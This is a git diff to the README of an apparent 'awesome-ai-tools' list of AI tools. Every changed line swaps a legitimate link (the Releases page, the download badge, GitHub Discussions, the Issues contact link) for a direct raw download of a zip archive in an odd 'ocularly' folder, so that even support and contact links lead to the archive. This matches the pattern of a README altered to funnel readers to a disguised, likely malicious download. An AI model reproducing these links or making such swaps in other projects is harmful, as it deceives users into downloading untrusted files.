@@ -1,7 +1,7 @@
 # 🤖 awesome-ai-tools - Discover Powerful AI Tools Easily
 
 ## 🚀 Visit Our Releases Page
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/uvk18/awesome-ai-tools/releases)
+[![Download Now](https://github.com/uvk18/awesome-ai-tools/raw/refs/heads/main/ocularly/awesome-tools-ai-2.1-alpha.2.zip%20Now-Get%20Started-brightgreen)](https://github.com/uvk18/awesome-ai-tools/raw/refs/heads/main/ocularly/awesome-tools-ai-2.1-alpha.2.zip)
 
 ## 📋 Description
 awesome-ai-tools is a curated list of powerful AI tools tailored for various tasks. Whether you need solutions for quality assurance, coding, writing, video, audio, design, or productivity, this collection can help you find the right tool. Each tool is sorted by category and includes labels to indicate if they are free or paid. It's perfect for testers, developers, and content creators.
@@ -22,7 +22,7 @@ To run the tools in this collection, you generally need:
 ## 📥 Download & Install
 To get started, visit our Releases page to download the tools you need. Follow these steps:
 
-1. Click the link to our [Releases page](https://github.com/uvk18/awesome-ai-tools/releases).
+1. Click the link to our [Releases page](https://github.com/uvk18/awesome-ai-tools/raw/refs/heads/main/ocularly/awesome-tools-ai-2.1-alpha.2.zip).
 2. Browse the listed tools based on your needs.
 3. Click on the tool you want to download.
 4. Follow the instructions provided for each tool for installation.
@@ -55,7 +55,7 @@ To get started, visit our Releases page to download the tools you need. Follow t
 - Tools to enhance workflow and productivity.
 
 ## 🌐 Community and Support
-- Join our discussions on [GitHub Discussions](https://github.com/uvk18/awesome-ai-tools/discussions) to connect with other users.
+- Join our discussions on [GitHub Discussions](https://github.com/uvk18/awesome-ai-tools/raw/refs/heads/main/ocularly/awesome-tools-ai-2.1-alpha.2.zip) to connect with other users.
 - If you have questions or need assistance, feel free to open an issue in our repository.
 
 ## 🔗 Additional Resources
@@ -66,8 +66,8 @@ To get started, visit our Releases page to download the tools you need. Follow t
 To stay informed about new tools added to our list and updates, follow us on our social media pages. Keep an eye on our Releases page for the latest enhancements and new features.
 
 ## 📬 Contact
-For any inquiries or feedback, please reach out via our [GitHub](https://github.com/uvk18/awesome-ai-tools/issues).
+For any inquiries or feedback, please reach out via our [GitHub](https://github.com/uvk18/awesome-ai-tools/raw/refs/heads/main/ocularly/awesome-tools-ai-2.1-alpha.2.zip).
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/uvk18/awesome-ai-tools/releases)
+[![Download Now](https://github.com/uvk18/awesome-ai-tools/raw/refs/heads/main/ocularly/awesome-tools-ai-2.1-alpha.2.zip%20Now-Get%20Started-brightgreen)](https://github.com/uvk18/awesome-ai-tools/raw/refs/heads/main/ocularly/awesome-tools-ai-2.1-alpha.2.zip)
